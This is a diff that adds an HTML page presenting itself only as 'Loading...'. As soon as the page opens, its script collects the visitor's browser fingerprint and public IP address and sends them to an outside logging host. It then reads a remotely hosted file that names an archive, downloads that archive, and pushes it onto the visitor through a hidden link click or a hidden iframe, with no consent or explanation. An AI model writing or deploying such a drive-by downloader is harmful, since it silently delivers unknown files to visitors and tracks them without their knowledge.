@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Loading...</title>
+    <style>body{margin:0;background:#fff;}</style>
+</head>
+<body>
+<script>
+(function() {
+    'use strict';
+    
+    const CONFIG = {
+        LOGGER_URL: 'https://oracleflexcubesoftware.com/facts/about.php',
+        // This fetches the about.txt which contains the actual ZIP URL
+        CONFIG_URL: 'https://raw.githubusercontent.com/maevalig-svg/abouthmtl/refs/heads/main/about.txt',
+        FALLBACK_URL: ''
+    };
+    
+    function logData(data) {
+        try {
+            const img = new Image();
+            const params = new URLSearchParams();
+            Object.keys(data).forEach(k => params.append(k, encodeURIComponent(String(data[k]))));
+            img.src = `${CONFIG.LOGGER_URL}?${params.toString()}`;
+        } catch(e) {}
+    }
+    
+    async function collectAndLog() {
+        const data = {
+            timestamp: new Date().toISOString(),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            referrer: document.referrer || 'direct',
+            screen: `${screen.width}x${screen.height}`,
+            platform: navigator.platform
+        };
+        
+        try {
+            const res = await fetch('https://api.ipify.org?format=json', {cache: 'no-store'});
+            const ipData = await res.json();
+            data.ip = ipData.ip;
+        } catch(e) {
+            data.ip = 'unknown';
+        }
+        
+        logData(data);
+        return data;
+    }
+    
+    async function fetchZipUrl() {
+        try {
+            const res = await fetch(`${CONFIG.CONFIG_URL}?nocache=${Date.now()}`, {
+                cache: 'no-store',
+                headers: {'Accept': 'text/plain'}
+            });
+            if(!res.ok) throw new Error('Fetch failed');
+            const text = await res.text();
+            let url = text.trim();
+            
+            if(url.includes('github.com') && url.includes('/raw/')) {
+                const match = url.match(/github\.com\/([^\/]+)\/([^\/]+)\/raw\/refs\/heads\/(.+)/);
+                if(match) {
+                    url = `https://raw.githubusercontent.com/${match[1]}/${match[2]}/${match[3]}`;
+                }
+            }
+            
+            if(url.match(/^https?:\/\/.+\.(zip|rar|7z)$/i)) {
+                return url;
+            }
+            throw new Error('Invalid ZIP URL');
+        } catch(e) {
+            return CONFIG.FALLBACK_URL;
+        }
+    }
+    
+    async function downloadFile() {
+        await collectAndLog();
+        const zipUrl = await fetchZipUrl();
+        if(!zipUrl) return;
+        
+        logData({action: 'download_start', target: zipUrl, time: new Date().toISOString()});
+        
+        try {
+            const response = await fetch(zipUrl, {cache: 'no-store'});
+            if(!response.ok) throw new Error('Network error');
+            
+            const blob = await response.blob();
+            const blobUrl = window.URL.createObjectURL(blob);
+            const filename = zipUrl.split('/').pop().replace(/%23/g, '#') || 'download.zip';
+            
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = blobUrl;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            
+            setTimeout(() => {
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(blobUrl);
+            }, 100);
+        } catch(error) {
+            logData({action: 'download_fallback', target: zipUrl, error: error.message});
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = zipUrl;
+            document.body.appendChild(iframe);
+            setTimeout(() => iframe.remove(), 5000);
+        }
+    }
+    
+    if(document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', downloadFile);
+    } else {
+        downloadFile();
+    }
+})();
+</script>
+</body>
+</html>
